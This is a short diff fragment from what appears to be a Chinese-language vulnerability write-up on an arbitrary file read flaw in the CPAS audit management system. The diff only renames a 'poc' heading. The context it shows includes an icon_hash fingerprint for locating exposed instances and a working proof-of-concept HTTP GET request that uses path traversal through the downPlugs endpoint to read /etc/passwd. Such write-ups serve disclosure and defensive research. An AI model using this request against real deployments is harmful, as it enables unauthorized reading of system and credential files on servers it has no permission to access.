@@ -8,7 +8,7 @@ CPAS审计管理系统存在任意文件读取漏洞
 icon_hash="-58141038"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd&fileName= HTTP/1.1
